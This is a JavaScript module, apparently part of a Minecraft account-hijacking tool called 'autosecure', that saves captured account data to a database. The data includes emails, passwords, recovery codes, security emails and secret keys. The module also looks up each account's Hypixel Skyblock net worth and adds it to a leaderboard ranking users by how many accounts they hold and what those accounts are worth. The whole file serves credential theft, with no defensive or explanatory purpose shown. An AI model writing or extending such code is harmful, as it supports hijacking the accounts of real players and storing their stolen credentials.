const { queryParams } = require("./db");
const getStats = require("../autosecure/utils/hypixelapi/getStats");
const getuuid = require("../autosecure/utils/hypixelapi/getUUID");
const { autosecurelogs } = require("../autosecure/utils/embeds/autosecurelogs");

async function saveAccountRows(acc, uid, ownerId, statsJson, currentEpoch) {
    await queryParams(
        `INSERT INTO accounts (uid, user_id, username, ownsmc, capes, email, recoverycode, secemail, secretkey, password, stats_id, time)
         VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
         ON CONFLICT(uid) DO UPDATE SET
           user_id = COALESCE(NULLIF(accounts.user_id, ''), excluded.user_id),
           username = excluded.username,
           ownsmc = excluded.ownsmc,
           capes = excluded.capes,
           email = excluded.email,
           recoverycode = excluded.recoverycode,
           secemail = excluded.secemail,
           secretkey = excluded.secretkey,
           password = excluded.password,
           stats_id = excluded.stats_id,
           time = excluded.time`,
        [
            uid,
            ownerId,
            acc.oldName,
            acc.mc,
            acc.capes,
            acc.email,
            acc.recoveryCode,
            acc.secEmail,
            acc.secretkey,
            acc.password,
            statsJson,
            currentEpoch
        ]
    );

    const existingLink = await queryParams(
        'SELECT 1 FROM accountsbyuser WHERE user_id = ? AND uid = ? LIMIT 1',
        [ownerId, uid]
    );
    if (!existingLink || existingLink.length === 0) {
        await queryParams(
            'INSERT INTO accountsbyuser (user_id, uid, time) VALUES (?, ?, ?)',
            [ownerId, uid, currentEpoch]
        );
    }

    await queryParams(
        `UPDATE extrainformation SET user_id = ? WHERE uid = ? AND (user_id IS NULL OR user_id = '')`,
        [ownerId, uid]
    ).catch(() => {});
}

async function insertaccount(acc, uid, user, secureifnomc = true, flag) {
    let fixnetworth;
    try {
        const ownerId = user !== null && user !== undefined ? String(user).trim() : '';
        if (!ownerId || !uid) {
            console.error('insertaccount refused: missing ownerId or uid', { ownerId, uid });
            return false;
        }

        const currentEpoch = Math.floor(Date.now() / 1000);
        let stats = null;

        if (flag) {
            let uuid = await getuuid(acc.oldName);
            stats = uuid ? await getStats(acc.oldName) : null;

            await saveAccountRows(acc, uid, ownerId, JSON.stringify(stats), currentEpoch);
            return true;
        }

        if (!acc || Object.values(acc).every(value => value === null)) {
            return false;
        }

        if (!secureifnomc && acc.newName === "No Minecraft!") {
            return true;
        }

        if (["unauthed", "Locked!", "Microsoft services are down!"].includes(acc.email)) {
            return true;
        }

        if (acc.email === "Could not login") {
            return true;
        }

        let uuid = await getuuid(acc.oldName);
        stats = uuid ? await getStats(acc.oldName) : null;
        let networth = 0;

        if (stats) {
            const profile = stats?.skyblock?.find(prof => prof.current === true);
            networth = profile?.networth;
        }

        fixnetworth = parseInt(networth) || 0;

        await saveAccountRows(acc, uid, ownerId, JSON.stringify(stats), currentEpoch);

        const leaderboardEntry = await queryParams(
            'SELECT * FROM leaderboard WHERE user_id = ?',
            [ownerId]
        );

        if (leaderboardEntry.length > 0) {
            await queryParams(
                'UPDATE leaderboard SET amount = amount + 1, networth = networth + ? WHERE user_id = ?',
                [fixnetworth, ownerId]
            );
        } else {
            await queryParams(
                'INSERT INTO leaderboard (user_id, networth, amount) VALUES (?, ?, 1)',
                [ownerId, fixnetworth]
            );
        }

        return true;
    } catch (error) {
        console.error("Error inserting account:", error);
        return false;
    }
}

module.exports = insertaccount;
